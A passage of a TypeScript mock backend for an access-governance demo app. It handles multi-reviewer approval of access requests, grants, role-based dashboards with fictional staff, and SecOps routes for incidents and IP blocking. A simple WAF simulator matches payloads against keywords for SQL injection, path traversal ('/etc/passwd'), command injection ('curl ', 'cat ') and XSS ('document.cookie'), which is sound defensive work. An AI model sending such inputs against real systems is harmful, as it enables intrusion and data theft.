          ref_id: req.id,
          request_id: req.id,
          resource_name: req.resource_name || req.resource_id,
          title: `Access Request Rejected`,
          message: `Access request ${req.id.slice(0, 10)} for ${req.resource_name || req.resource_id} was REJECTED by ${revName} (${rejectingSlot?.slot_role}). Rationale: "${rejectingSlot?.rationale || 'Policy criteria not met'}"`,
          summary_breakdown: breakdown,
          created_at: new Date().toISOString(),
          read: false,
        });
        saveStoredNotifications(notifs);
      } else if (allApproved) {
        req.status = 'APPROVED';

        // Auto-activate Grant
        const grants = getStoredGrants();
        let finalDurationMin = req.duration_minutes || 1440;
        let finalActions = [...(req.actions || [])];

        req.slots.forEach((s) => {
          if (s.approved_limits) {
            if (s.approved_limits.duration_minutes) {
              finalDurationMin = Math.min(finalDurationMin, Number(s.approved_limits.duration_minutes));
            }
            if (Array.isArray(s.approved_limits.actions)) {
              finalActions = finalActions.filter((a) => s.approved_limits!.actions!.includes(a));
            }
          }
        });

        const newGrant: Grant = {
          id: `grant_${Date.now().toString(36)}`,
          request_id: req.id,
          requester_sub: req.requester_sub,
          subject_id: req.requester_sub,
          subject_name: req.requester_name || req.requester_sub,
          resource_id: req.resource_id,
          resource_name: req.resource_name,
          resource_tier: req.resource_tier,
          purpose_code: req.purpose_code,
          actions: finalActions.length > 0 ? finalActions : req.actions,
          duration_seconds: finalDurationMin * 60,
          status: 'ACTIVE',
          effective_status: 'ACTIVE',
          activated_at: new Date().toISOString(),
          expires_at: new Date(Date.now() + finalDurationMin * 60 * 1000).toISOString(),
          invocation_count: 0,
          utilization_status: 'ACTIVE_UTILIZING',
        };

        const existingIdx = grants.findIndex((g) => g.request_id === req.id);
        if (existingIdx >= 0) {
          grants[existingIdx] = newGrant;
        } else {
          grants.unshift(newGrant);
        }
        saveStoredGrants(grants);

        // Notify requester of approval with full summary breakdown
        const notifs = getStoredNotifications();
        const breakdown: NotificationSlotSummary[] = req.slots.map((s) => ({
          slot_role: s.slot_role,
          reviewer_name:
            s.decided_by_sub && currentUser && s.decided_by_sub === currentUser.sub
              ? (currentUser.display_name || currentUser.sub)
              : s.decided_by_sub || s.assigned_sub || 'Assigned Reviewer',
          reviewer_sub: s.decided_by_sub || s.assigned_sub || 'reviewer',
          decision: (s.status as any) || 'APPROVED',
          rationale: s.rationale || 'Approved under multi-party governance controls',
          decided_at: s.decided_at,
        }));


        notifs.unshift({
          id: `notif_${Date.now().toString(36)}`,
          to_sub: req.requester_sub,
          kind: 'REQUEST_APPROVED',
          ref_id: newGrant.id,
          request_id: req.id,
          grant_id: newGrant.id,
          resource_name: req.resource_name || req.resource_id,
          title: `Access Request Approved`,
          message: `Access request ${req.id.slice(0, 10)} for ${req.resource_name || req.resource_id} was APPROVED by all reviewers! An active grant is now enforced.`,
          summary_breakdown: breakdown,
          created_at: new Date().toISOString(),
          read: false,
        });
        saveStoredNotifications(notifs);
      }


      requests[reqIdx] = req;
      saveStoredRequests(requests);
      return { success: true, request: req, request_status: req.status };
    }
    return { success: true };
  }

  // 6. Withdraw request
  if (pathname.endsWith('/withdraw') && method === 'POST') {
    const parts = pathname.split('/');
    const reqId = parts[3];
    const requests = getStoredRequests();
    const req = requests.find((r) => r.id === reqId);
    if (req) {
      req.status = 'WITHDRAWN';
      saveStoredRequests(requests);
    }
    return { success: true };
  }

  // 7. Grants list
  if (pathname === '/api/grants' && method === 'GET') {
    const grants = getStoredGrants();
    const statusParam = (url.searchParams.get('status') || 'all').toLowerCase();
    const scopeParam = (url.searchParams.get('scope') || 'visible').toLowerCase();
    const sub = currentUser?.sub || 'priya';
    const roles = (currentUser?.roles || []).map((r: string) => r.toLowerCase());
    const isPrivileged = roles.some((r: string) =>
      ['admin', 'executive', 'compliance', 'security_admin', 'data_governance', 'risk_reviewer', 'manager', 'resource_owner'].includes(r)
    );

    return grants
      .map((g) => {
        const isExpired = g.expires_at && new Date(g.expires_at).getTime() <= Date.now();
        const eff = g.status === 'REVOKED' ? 'REVOKED' : isExpired ? 'EXPIRED' : 'ACTIVE';
        return {
          ...g,
          status: eff,
          effective_status: eff,
        };
      })
      .filter((g) => {
        if (statusParam === 'active' && g.status !== 'ACTIVE') return false;
        if (statusParam === 'expired' && g.status !== 'EXPIRED') return false;
        if (statusParam === 'revoked' && g.status !== 'REVOKED') return false;

        if (scopeParam === 'mine') {
          return g.requester_sub === sub;
        }
        if (scopeParam === 'visible' && !isPrivileged) {
          return g.requester_sub === sub;
        }
        return true;
      });
  }

  // 8. Revoke Grant & Early Release
  if (pathname.includes('/api/grants/') && (pathname.endsWith('/revoke') || pathname.endsWith('/release-early')) && method === 'POST') {
    const parts = pathname.split('/');
    const grantId = parts[3];
    const body = options.body ? JSON.parse(String(options.body)) : {};
    const grants = getStoredGrants();
    const g = grants.find((x) => x.id === grantId);
    if (g) {
      if (pathname.endsWith('/release-early') || body.reason_code === 'PURPOSE_COMPLETE') {
        g.status = 'EXPIRED';
        g.effective_status = 'EXPIRED';
      } else {
        g.status = 'REVOKED';
        g.effective_status = 'REVOKED';
        g.revoked_at = new Date().toISOString();
        g.revocation_reason = body.note || 'Revoked by authorized governance administrator.';
        g.revoke_emergency = Boolean(body.emergency);
      }
      saveStoredGrants(grants);
    }
    return { success: true, grant: g };
  }

  // 10. Hierarchy approval preview
  if (pathname === '/api/hierarchy/preview-approval') {
    const resId = url.searchParams.get('resource_id') || 'D-customers-synth';
    const resource = INITIAL_RESOURCES.find((r) => r.id === resId) || INITIAL_RESOURCES[0];
    return {
      requester_id: currentUser?.sub || 'priya',
      requester_name: currentUser?.display_name || 'Priya Sharma',
      resource_id: resId,
      resource_name: resource.name,
      is_crucial: resource.tier === 'RESTRICTED_SYNTHETIC' || resource.tier === 'TIER_1_CRITICAL',
      is_cross_dept: false,
      steps: [
        { level: 1, slot_role: 'manager', assigned_sub: 'carol', title: 'Carol Danvers (Engineering Manager)', is_crucial_escalation: false },
        { level: 2, slot_role: 'risk_reviewer', assigned_sub: 'elena', title: 'Elena Rostova (Compliance & Risk Pool)', is_crucial_escalation: false },
        { level: 3, slot_role: 'resource_owner', assigned_sub: 'david', title: 'David Miller (Resource Owner)', is_crucial_escalation: false },
      ],
      approval_path: [
        { stage: 1, role: 'manager', reviewer: 'Carol Danvers (Engineering Manager)' },
        { stage: 2, role: 'risk_reviewer', reviewer: 'Elena Rostova (Compliance & Risk Pool)' },
        { stage: 3, role: 'resource_owner', reviewer: 'David Miller (Resource Owner)' },
      ],
    };
  }

  // 11. My Access
  if (pathname === '/api/my-access' && method === 'GET') {
    const grants = getStoredGrants();
    const requests = getStoredRequests();
    const sub = currentUser?.sub || 'priya';
    const roles = (currentUser?.roles || []).map((r: string) => r.toLowerCase());
    const isAdmin = roles.some((r: string) => ['admin', 'executive'].includes(r));
    const isManager = roles.some((r: string) => ['manager', 'data_governance', 'admin'].includes(r));
    const isRiskReviewer = roles.some((r: string) => ['risk_reviewer', 'compliance', 'admin', 'executive'].includes(r));
    const isResourceOwner = roles.some((r: string) => ['resource_owner', 'security_admin', 'admin'].includes(r));

    const userGrants = grants.filter((g) => g.requester_sub === sub);
    const activeGrants = userGrants.filter((g) => g.status === 'ACTIVE');

    const myActiveAccess = activeGrants.map((g) => {
      const res = INITIAL_RESOURCES.find((r) => r.id === g.resource_id);
      const expAt = new Date(g.expires_at).getTime();
      const remainingHours = Math.max(0, Math.round((expAt - Date.now()) / 3600000));
      return {
        grant_id: g.id,
        request_id: g.request_id,
        resource_id: g.resource_id,
        resource_name: res?.name || g.resource_name || g.resource_id,
        resource_owner: 'David Miller (Security Admin)',
        actions: g.actions,
        purpose_code: g.purpose_code,
        activated_at: g.activated_at || new Date(Date.now() - 3600000 * 4).toISOString(),
        expires_at: g.expires_at,
        effective_status: g.effective_status || g.status,
        remaining_hours: remainingHours,
        is_expiring_soon: remainingHours <= 48,
        invocation_count: g.invocation_count || 0,
        limits: {},
      };
    });

    const expiringAccess = myActiveAccess.filter((g) => g.is_expiring_soon);

    const userRequests = requests.filter((r) => r.requester_sub === sub);
    const myAccessRequests = userRequests.map((r) => {
      const res = INITIAL_RESOURCES.find((resItem) => resItem.id === r.resource_id);
      const stages: any = {
        manager: { status: 'PENDING', assigned_to: 'Carol Danvers (Manager)', decision: null, decided_at: null },
        risk_reviewer: { status: 'PENDING', assigned_to: 'Elena Rostova (Risk)', decision: null, decided_at: null },
        resource_owner: { status: 'PENDING', assigned_to: 'David Miller (Owner)', decision: null, decided_at: null },
      };
      if (r.slots) {
        for (const s of r.slots) {
          if (stages[s.slot_role]) {
            stages[s.slot_role] = {
              id: s.id,
              status: s.status,
              assigned_to: s.assigned_sub || s.slot_role,
              decision: s.decision || null,
              decided_by: s.decided_by_sub || null,
              decided_at: s.decided_at || null,
              rationale: s.rationale || '',
            };
          }
        }
      }
      return {
        request_id: r.id,
        resource_id: r.resource_id,
        resource_name: res?.name || r.resource_name || r.resource_id,
        purpose_code: r.purpose_code,
        purpose_text: r.purpose_text,
        actions: r.actions,
        duration_minutes: r.duration_minutes,
        status: r.status,
        created_at: r.created_at,
        approval_stages: stages,
      };
    });

    const securityAlerts = [
      {
        id: 'ev_alrt_01',
        timestamp: new Date(Date.now() - 3600000 * 3).toISOString(),
        category: 'POLICY_INSPECTION',
        severity: 'LOW',
        action_taken: 'ALLOWED',
        risk_score: 15,
        path: '/api/resources/finance.csv/query',
        incident_id: null,
        pattern_matched: 'SYNTHETIC_DATA_QUERY',
        description: 'Grant gate policy engine validated active cryptographic token without anomaly.',
      },
    ];

    const accessHistory = [
      {
        id: 'aud_hist_01',
        timestamp: new Date(Date.now() - 3600000 * 4).toISOString(),
        event_type: 'GRANT_ACTIVATED',
        actor_sub: 'system',
        subject_id: sub,
        payload: { grant_id: 'grant_claims_priya_02', resource_id: 'D-claims-synth' },
      },
      {
        id: 'aud_hist_02',
        timestamp: new Date(Date.now() - 3600000 * 5).toISOString(),
        event_type: 'REQUEST_SUBMITTED',
        actor_sub: sub,
        subject_id: sub,
        payload: { request_id: 'req_priya_claims_approved' },
      },
    ];

    const smartRecommendations = [
      {
        grant_id: 'grant_claims_priya_02',
        type: 'LEAST_PRIVILEGE',
        severity: 'INFO',
        title: 'Least Privilege Verification',
        recommendation: 'Grant scope matches current model evaluation activity. Keep duration under 24 hours per SG-6.',
        action_suggested: 'narrow_renewal',
      },
    ];

    // Manager View Data
    const managerView = {
      team_members_count: 3,
      pending_approvals_count: requests.filter((r) => r.status === 'IN_REVIEW' && r.slots?.some((s) => s.slot_role === 'manager' && s.status === 'PENDING')).length,
      pending_approvals: requests
        .filter((r) => r.status === 'IN_REVIEW' && r.slots?.some((s) => s.slot_role === 'manager' && s.status === 'PENDING'))
        .map((r) => {
          const slot = r.slots?.find((s) => s.slot_role === 'manager' && s.status === 'PENDING');
          const res = INITIAL_RESOURCES.find((resItem) => resItem.id === r.resource_id);
          return {
            request_id: r.id,
            slot_id: slot?.id,
            requester_sub: r.requester_sub,
            requester_name: r.requester_name || r.requester_sub,
            requester_dept: r.requester_dept || 'Engineering',
            resource_id: r.resource_id,
            resource_name: res?.name || r.resource_name || r.resource_id,
            purpose_code: r.purpose_code,
            purpose_text: r.purpose_text,
            actions: r.actions,
            duration_minutes: r.duration_minutes,
            status: r.status,
            created_at: r.created_at,
          };
        }),
      team_requests: requests.map((r) => ({
        request_id: r.id,
        requester_sub: r.requester_sub,
        requester_name: r.requester_name || r.requester_sub,
        requester_dept: r.requester_dept || 'Engineering',
        resource_id: r.resource_id,
        resource_name: r.resource_name || r.resource_id,
        purpose_code: r.purpose_code,
        purpose_text: r.purpose_text,
        actions: r.actions,
        duration_minutes: r.duration_minutes,
        status: r.status,
        created_at: r.created_at,
      })),
      team_members: [
        { sub: 'priya', name: 'Priya Sharma', email: 'priya@example.com', role: 'ML Lead', active_grants_count: 1 },
        { sub: 'alice', name: 'Alice Chen', email: 'alice@example.com', role: 'ML Engineer', active_grants_count: 1 },
        { sub: 'bob', name: 'Bob Smith', email: 'bob@example.com', role: 'ML Engineer', active_grants_count: 0 },
      ],
      approval_history: [
        {
          slot_id: 'slot_mgr_03',
          request_id: 'req_demo_approved',
          decision: 'APPROVED',
          rationale: 'Approved for sentiment benchmark verification.',
          decided_at: new Date(Date.now() - 3600000 * 20).toISOString(),
        },
      ],
    };

    // Risk Reviewer View Data
    const riskReviewerReqs = requests.filter((r) => r.slots?.some((s) => s.slot_role === 'risk_reviewer' && s.status === 'PENDING'));
    const riskReviewerView = {
      pending_risk_evaluations_count: riskReviewerReqs.length,
      risk_review_requests: riskReviewerReqs.map((r) => {
        const slot = r.slots?.find((s) => s.slot_role === 'risk_reviewer' && s.status === 'PENDING');
        const res = INITIAL_RESOURCES.find((resItem) => resItem.id === r.resource_id);
        return {
          request_id: r.id,
          slot_id: slot?.id,
          requester_sub: r.requester_sub,
          requester_name: r.requester_name || r.requester_sub,
          requester_dept: r.requester_dept || 'AI Engineering',
          resource_id: r.resource_id,
          resource_name: res?.name || r.resource_name || r.resource_id,
          resource_tier: res?.tier || 'RESTRICTED_SYNTHETIC',
          is_crucial: res?.tier === 'RESTRICTED_SYNTHETIC',
          purpose_code: r.purpose_code,
          purpose_text: r.purpose_text,
          duration_minutes: r.duration_minutes,
          actions: r.actions,
          risk_controls: r.risk_controls || ['activity_logging'],
          created_at: r.created_at,
        };
      }),
      suspicious_access_alerts: [
        {
          id: 'alert_sec_001',
          timestamp: new Date(Date.now() - 3600000 * 2).toISOString(),
          source_ip: '198.51.100.99',
          category: 'SQLI',
          risk_score: 95,
          severity: 'CRITICAL',
          action_taken: 'BLOCKED',
          user_sub: 'unauthenticated_probe',
        },
      ],
    };

    // Resource Owner View Data
    const roApprovals = requests.filter((r) => r.slots?.some((s) => s.slot_role === 'resource_owner' && s.status === 'PENDING'));
    const resourceOwnerView = {
      owned_resources_count: INITIAL_RESOURCES.length,
      owned_resources: INITIAL_RESOURCES.map((r) => ({
        id: r.id,
        name: r.name,
        tier: r.tier,
        type: r.type,
        department: r.department,
        is_active: r.is_active,
      })),
      pending_owner_approvals_count: roApprovals.length,
      pending_approvals: roApprovals.map((r) => {
        const slot = r.slots?.find((s) => s.slot_role === 'resource_owner' && s.status === 'PENDING');
        const res = INITIAL_RESOURCES.find((resItem) => resItem.id === r.resource_id);
        return {
          request_id: r.id,
          slot_id: slot?.id,
          requester_sub: r.requester_sub,
          requester_name: r.requester_name || r.requester_sub,
          requester_dept: r.requester_dept || 'AI Engineering',
          resource_id: r.resource_id,
          resource_name: res?.name || r.resource_name || r.resource_id,
          purpose_code: r.purpose_code,
          purpose_text: r.purpose_text,
          actions: r.actions,
          duration_minutes: r.duration_minutes,
          created_at: r.created_at,
        };
      }),
      resource_requests: requests.map((r) => ({
        request_id: r.id,
        resource_id: r.resource_id,
        requester_sub: r.requester_sub,
        actions: r.actions,
        status: r.status,
      })),
      active_grants: grants.filter((g) => g.status === 'ACTIVE').map((g) => ({
        grant_id: g.id,
        resource_id: g.resource_id,
        requester_sub: g.requester_sub,
        actions: g.actions,
        activated_at: g.activated_at || new Date().toISOString(),
        expires_at: g.expires_at,
        invocation_count: g.invocation_count || 0,
      })),
    };

    // Admin View Data
    const adminView = {
      is_admin: true,
      total_users: 7,
      total_agents: 2,
      hierarchy_tree: {
        tree_root: 'E001',
        principals: [
          { id: 'fiona', name: 'Fiona Gallagher', role: 'EXECUTIVE', department: 'Executive', manager_id: null, email: 'fiona@example.com', is_agent: false, owned_agents: [] },
          { id: 'carol', name: 'Carol Danvers', role: 'DATA_GOVERNANCE', department: 'Data Governance', manager_id: 'fiona', email: 'carol@example.com', is_agent: false, owned_agents: [] },
          { id: 'david', name: 'David Miller', role: 'SECURITY_ADMIN', department: 'Security', manager_id: 'fiona', email: 'david@example.com', is_agent: false, owned_agents: [] },
          { id: 'elena', name: 'Elena Rostova', role: 'COMPLIANCE', department: 'Compliance', manager_id: 'fiona', email: 'elena@example.com', is_agent: false, owned_agents: [] },
          { id: 'priya', name: 'Priya Sharma', role: 'ML_LEAD', department: 'AI Engineering', manager_id: 'carol', email: 'priya@example.com', is_agent: false, owned_agents: [] },
          { id: 'alice', name: 'Alice Chen', role: 'ML_ENGINEER', department: 'AI Engineering', manager_id: 'carol', email: 'alice@example.com', is_agent: false, owned_agents: [] },
          { id: 'bob', name: 'Bob Smith', role: 'ML_ENGINEER', department: 'AI Engineering', manager_id: 'carol', email: 'bob@example.com', is_agent: false, owned_agents: [] },
          { id: 'agent_analyst_01', name: 'SecOps Autonomous Sentinel', role: 'AI Agent', department: 'Security', manager_id: 'david', owner_id: 'david', delegated_permissions: ['query_telemetry', 'isolate_ip'], is_agent: true },
          { id: 'agent_eval_02', name: 'Model Evaluation Assistant', role: 'AI Agent', department: 'AI Engineering', manager_id: 'priya', owner_id: 'priya', delegated_permissions: ['run_benchmark'], is_agent: true },
        ],
        departments: {
          'Executive': [{ id: 'fiona', name: 'Fiona Gallagher', role: 'EXECUTIVE' }],
          'Data Governance': [{ id: 'carol', name: 'Carol Danvers', role: 'DATA_GOVERNANCE' }],
          'Security': [{ id: 'david', name: 'David Miller', role: 'SECURITY_ADMIN' }, { id: 'agent_analyst_01', name: 'SecOps Sentinel', is_agent: true }],
          'Compliance': [{ id: 'elena', name: 'Elena Rostova', role: 'COMPLIANCE' }],
          'AI Engineering': [{ id: 'priya', name: 'Priya Sharma', role: 'ML_LEAD' }, { id: 'alice', name: 'Alice Chen', role: 'ML_ENGINEER' }, { id: 'agent_eval_02', name: 'Eval Assistant', is_agent: true }],
        },
        total_humans: 7,
        total_agents: 2,
      },
    };

    return {
      user_profile: {
        sub,
        display_name: currentUser?.display_name || 'Priya Sharma',
        email: currentUser?.email || 'priya@example.com',
        manager_sub: 'carol',
        roles: currentUser?.roles || ['requester'],
        is_admin: isAdmin,
        is_manager: isManager,
        is_risk_reviewer: isRiskReviewer,
        is_resource_owner: isResourceOwner,
      },
      employee_view: {
        my_active_access: myActiveAccess,
        my_access_requests: myAccessRequests,
        expiring_access: expiringAccess,
        security_alerts: securityAlerts,
        access_history: accessHistory,
        smart_recommendations: smartRecommendations,
      },
      manager_view: managerView,
      risk_reviewer_view: riskReviewerView,
      resource_owner_view: resourceOwnerView,
      admin_view: adminView,
    };
  }

  // 11.1 Access Renewal
  if (pathname === '/api/my-access/renew' && method === 'POST') {
    const body = options.body ? JSON.parse(String(options.body)) : {};
    const grants = getStoredGrants();
    const grant = grants.find((g) => g.id === body.grant_id);
    const sub = currentUser?.sub || 'priya';
    const requests = getStoredRequests();

    const newReqId = `req_renew_${Date.now().toString(36)}`;
    const newReq: AccessRequest = {
      id: newReqId,
      requester_sub: sub,
      requester_id: sub,
      requester_name: currentUser?.display_name || 'Priya Sharma',
      requester_dept: 'AI Engineering',
      resource_id: grant?.resource_id || 'D-claims-synth',
      resource_name: grant?.resource_name || 'Synthetic Claims Dataset',
      purpose_code: grant?.purpose_code || 'FRAUD_RULE_TUNING',
      purpose_text: body.justification || 'Access renewal request',
      actions: grant?.actions || ['read_sample'],
      duration_minutes: body.additional_minutes || 1440,
      duration_hours: Math.round((body.additional_minutes || 1440) / 60),
      risk_controls: ['activity_logging', 'synthetic_data_only'],
      status: 'IN_REVIEW',
      created_at: new Date().toISOString(),
      slots: [
        { id: `slot_mgr_${Date.now()}`, slot_index: 0, slot_role: 'manager', assigned_sub: 'carol', status: 'PENDING' },
        { id: `slot_rsk_${Date.now()}`, slot_index: 1, slot_role: 'risk_reviewer', assigned_sub: 'elena', status: 'PENDING' },
        { id: `slot_own_${Date.now()}`, slot_index: 2, slot_role: 'resource_owner', assigned_sub: 'david', status: 'PENDING' },
      ],
    };
    requests.unshift(newReq);
    saveStoredRequests(requests);

    return {
      status: 'SUBMITTED',
      request_id: newReq.id,
      resource_id: newReq.resource_id,
      duration_minutes: newReq.duration_minutes,
      message: 'Renewal request submitted successfully and queued for 3-stage governance review.',
    };
  }

  // =========================================================================
  // SECOPS & WAF DEFENSE ROUTES
  // =========================================================================

  // S1. SecOps Summary
  if (pathname === '/api/secops/summary' && method === 'GET') {
    const incidents = getStoredIncidents();
    const ips = getStoredIps();
    const events = getStoredEvents();
    const iocs = getStoredIocs();

    const activeIncidents = incidents.filter((inc) => inc.status !== 'CLOSED').length;
    const blockedIps = ips.filter((ip) => ip.status === 'TEMP_BLOCKED' || ip.status === 'PERM_BLOCKED').length;
    const totalEvents = events.length;
    const attacksDetected = events.filter((ev) => ev.risk_score >= 30).length;

    return {
      active_incidents: activeIncidents,
      blocked_ips: blockedIps,
      total_security_events: totalEvents,
      attacks_detected: attacksDetected,
      active_threat_intel_count: iocs.length,
      recent_incidents: incidents.slice(0, 5).map((inc) => ({
        id: inc.id,
        title: inc.title,
        severity: inc.severity,
        priority: inc.priority,
        status: inc.status,
        source_ip: inc.source_ip,
        created_at: inc.created_at,
      })),
    };
  }

  // S2. SecOps Incidents list
  if (pathname === '/api/secops/incidents' && method === 'GET') {
    const incidents = getStoredIncidents();
    const statusFilter = url.searchParams.get('status');
    const severityFilter = url.searchParams.get('severity');

    let filtered = incidents;
    if (statusFilter && statusFilter !== 'ALL') {
      filtered = filtered.filter((i) => i.status === statusFilter);
    }
    if (severityFilter && severityFilter !== 'ALL') {
      filtered = filtered.filter((i) => i.severity === severityFilter);
    }

    return { incidents: filtered };
  }

  // S3. Incident Detail / Contain / Update
  if (pathname.startsWith('/api/secops/incidents/')) {
    const parts = pathname.split('/');
    const incidentId = parts[4];
    const subAction = parts[5];
    const incidents = getStoredIncidents();
    const inc = incidents.find((i) => i.id === incidentId);

    if (method === 'GET') {
      if (!inc) {
        return incidents[0] || { id: incidentId, title: 'Security Incident', status: 'NEW' };
      }
      return inc;
    }

    if (method === 'PATCH') {
      const body = options.body ? JSON.parse(String(options.body)) : {};
      if (inc) {
        if (body.status) inc.status = body.status;
        if (body.assigned_to) inc.assigned_to = body.assigned_to;
        if (body.note) {
          if (!inc.investigation_notes) inc.investigation_notes = [];
          inc.investigation_notes.push({
            note_id: `note_${Date.now()}`,
            timestamp: new Date().toISOString(),
            author: currentUser?.display_name || 'SecOps Analyst',
            text: body.note,
          });
        }
        if (body.resolution_notes) inc.resolution_notes = body.resolution_notes;
        inc.updated_at = new Date().toISOString();
        saveStoredIncidents(incidents);
      }
      return { success: true, incident: inc };
    }

    if (subAction === 'contain' && method === 'POST') {
      const body = options.body ? JSON.parse(String(options.body)) : {};
      if (inc) {
        inc.status = 'CONTAINED';
        if (!inc.investigation_notes) inc.investigation_notes = [];
        inc.investigation_notes.push({
          note_id: `note_${Date.now()}`,
          timestamp: new Date().toISOString(),
          author: currentUser?.display_name || 'SecOps Incident Commander',
          text: `Containment action executed: ${body.action || 'isolate_ip'}`,
        });
        inc.updated_at = new Date().toISOString();
        saveStoredIncidents(incidents);

        if (body.action === 'isolate_ip' || body.action === 'isolate_ip_and_block_user') {
          const ips = getStoredIps();
          const targetIp = ips.find((x) => x.ip === inc.source_ip);
          if (targetIp) {
            targetIp.status = 'TEMP_BLOCKED';
            targetIp.risk_score = 100;
            targetIp.blocked_until = new Date(Date.now() + 3600000 * 24).toISOString();
            targetIp.block_reason = `Isolated by SecOps Incident Containment on ${inc.id}`;
          } else {
            ips.unshift({
              ip: inc.source_ip,
              status: 'TEMP_BLOCKED',
              risk_score: 100,
              malicious_attempts: 1,
              last_seen_at: new Date().toISOString(),
              blocked_until: new Date(Date.now() + 3600000 * 24).toISOString(),
              block_reason: `Isolated by SecOps Incident Containment on ${inc.id}`,
              manual_override: true,
            });
          }
          saveStoredIps(ips);
        }
      }
      return { success: true, message: 'Containment executed successfully', incident: inc };
    }
  }

  // S4. IP Reputations
  if (pathname === '/api/secops/ips' && method === 'GET') {
    const ips = getStoredIps();
    const statusParam = url.searchParams.get('status');
    let filtered = ips;
    if (statusParam && statusParam !== 'ALL') {
      filtered = filtered.filter((i) => i.status === statusParam);
    }
    return { ips: filtered };
  }

  // S5. Block IP
  if (pathname === '/api/secops/ips/block' && method === 'POST') {
    const body = options.body ? JSON.parse(String(options.body)) : {};
    const ips = getStoredIps();
    const isPerm = Boolean(body.permanent || body.is_permanent);
    const existing = ips.find((i) => i.ip === body.ip);
    if (existing) {
      existing.status = isPerm ? 'PERM_BLOCKED' : 'TEMP_BLOCKED';
      existing.risk_score = 100;
      existing.block_reason = body.reason || 'Blocked by SecOps administrator';
      existing.manual_override = true;
      if (!isPerm) {
        existing.blocked_until = new Date(Date.now() + 3600000 * (body.duration_minutes ? body.duration_minutes / 60 : 24)).toISOString();
      }
    } else {
      ips.unshift({
        ip: body.ip,
        status: isPerm ? 'PERM_BLOCKED' : 'TEMP_BLOCKED',
        risk_score: 100,
        malicious_attempts: 1,
        last_seen_at: new Date().toISOString(),
        block_reason: body.reason || 'Blocked by SecOps administrator',
        manual_override: true,
        blocked_until: isPerm ? undefined : new Date(Date.now() + 3600000 * 24).toISOString(),
      });
    }
    saveStoredIps(ips);
    return { success: true, ip: body.ip };
  }

  // S6. Unblock IP
  if (pathname === '/api/secops/ips/unblock' && method === 'POST') {
    const body = options.body ? JSON.parse(String(options.body)) : {};
    const ips = getStoredIps();
    const target = ips.find((i) => i.ip === body.ip);
    if (target) {
      target.status = 'CLEAN';
      target.risk_score = 10;
      target.block_reason = body.reason || 'Administrative unblock';
      target.manual_override = true;
      saveStoredIps(ips);
    }
    return { success: true, ip: body.ip };
  }

  // S7. Allowlist IP
  if (pathname === '/api/secops/ips/allowlist' && method === 'POST') {
    const body = options.body ? JSON.parse(String(options.body)) : {};
    const ips = getStoredIps();
    const target = ips.find((i) => i.ip === body.ip);
    if (target) {
      target.status = 'ALLOWLISTED';
      target.risk_score = 0;
      target.block_reason = body.reason || 'Trusted corporate infrastructure';
      target.manual_override = true;
    } else {
      ips.unshift({
        ip: body.ip,
        status: 'ALLOWLISTED',
        risk_score: 0,
        malicious_attempts: 0,
        last_seen_at: new Date().toISOString(),
        block_reason: body.reason || 'Trusted corporate infrastructure',
        manual_override: true,
      });
    }
    saveStoredIps(ips);
    return { success: true, ip: body.ip };
  }

  // S8. Threat Intelligence Indicators
  if (pathname === '/api/secops/threat-intel' && method === 'GET') {
    return { indicators: getStoredIocs() };
  }

  if (pathname === '/api/secops/threat-intel' && method === 'POST') {
    const body = options.body ? JSON.parse(String(options.body)) : {};
    const iocs = getStoredIocs();
    const newIoc: ThreatIntelIndicator = {
      id: `ioc_${Date.now().toString(36)}`,
      type: body.type || 'IP',
      value: body.value,
      threat_actor: body.threat_actor || null,
      campaign: body.campaign || null,
      confidence: body.confidence || 85,
      description: body.description || 'Threat intel indicator',
      added_at: new Date().toISOString(),
    };
    iocs.unshift(newIoc);
    saveStoredIocs(iocs);
    return { success: true, indicator: newIoc };
  }

  if (pathname.startsWith('/api/secops/threat-intel/') && method === 'DELETE') {
    const parts = pathname.split('/');
    const iocId = parts[4];
    const iocs = getStoredIocs().filter((i) => i.id !== iocId);
    saveStoredIocs(iocs);
    return { success: true };
  }

  // S9. Security Events Audit
  if (pathname === '/api/secops/events' && method === 'GET') {
    const events = getStoredEvents();
    const category = url.searchParams.get('category');
    const action = url.searchParams.get('action');
    const sourceIp = url.searchParams.get('source_ip');
    const limit = Number(url.searchParams.get('limit')) || 50;

    let filtered = events;
    if (category && category !== 'ALL') {
      filtered = filtered.filter((e) => e.category === category);
    }
    if (action && action !== 'ALL') {
      filtered = filtered.filter((e) => e.action_taken === action);
    }
    if (sourceIp) {
      filtered = filtered.filter((e) => e.source_ip.includes(sourceIp));
    }

    return { events: filtered.slice(0, limit), total: filtered.length };
  }

  // S10. WAF Attack Simulator
  if (pathname === '/api/secops/simulate' && method === 'POST') {
    const body = options.body ? JSON.parse(String(options.body)) : {};
    const ip = body.source_ip || '198.51.100.99';
    const methodStr = body.method || 'POST';
    const pathStr = body.path || '/api/resources/finance.csv/query';
    const payloadStr = typeof body.payload === 'string' ? body.payload : JSON.stringify(body.payload || '');

    // Threat detection heuristics
    let category = 'CLEAN';
    let riskScore = 0;
    let actionTaken: 'ALLOWED' | 'FLAGGED' | 'RATE_LIMITED' | 'BLOCKED' = 'ALLOWED';
    let patternMatched = '';

    const lower = payloadStr.toLowerCase();
    if (lower.includes('union') && lower.includes('select')) {
      category = 'SQLI';
      riskScore = 95;
      actionTaken = 'BLOCKED';
      patternMatched = 'UNION SELECT';
    } else if (lower.includes('../') || lower.includes('..%2f') || lower.includes('/etc/passwd')) {
      category = 'PATH_TRAVERSAL';
      riskScore = 85;
      actionTaken = 'BLOCKED';
      patternMatched = '../ (directory escape)';
    } else if (lower.includes('cat ') || lower.includes('|') || lower.includes('curl ') || (lower.includes(';') && lower.includes('/etc/'))) {
      category = 'COMMAND_INJECTION';
      riskScore = 100;
      actionTaken = 'BLOCKED';
      patternMatched = 'System shell execution chain [; |]';
    } else if (lower.includes('<script') || lower.includes('javascript:') || lower.includes('document.cookie')) {
      category = 'XSS';
      riskScore = 75;
      actionTaken = 'FLAGGED';
      patternMatched = '<script> tag injection';
    }

    const events = getStoredEvents();
    const newEvent: SecurityEvent = {
      id: `ev_sim_${Date.now().toString(36)}`,
      timestamp: new Date().toISOString(),
      source_ip: ip,
      method: methodStr,
      path: pathStr,
      payload_snippet: payloadStr.slice(0, 160),
      category,
      risk_score: riskScore,
      severity: riskScore >= 80 ? 'CRITICAL' : riskScore >= 60 ? 'HIGH' : riskScore >= 30 ? 'MEDIUM' : 'LOW',
      action_taken: actionTaken,
      pattern_matched: patternMatched || undefined,
      repeat_count: 1,
      status: 'PROCESSED',
    };
    events.unshift(newEvent);
    saveStoredEvents(events);

    let newIncidentId: string | undefined;
    if (riskScore >= 70) {
      const incidents = getStoredIncidents();
      const snNum = `SIR00100${Math.floor(Math.random() * 80) + 20}`;
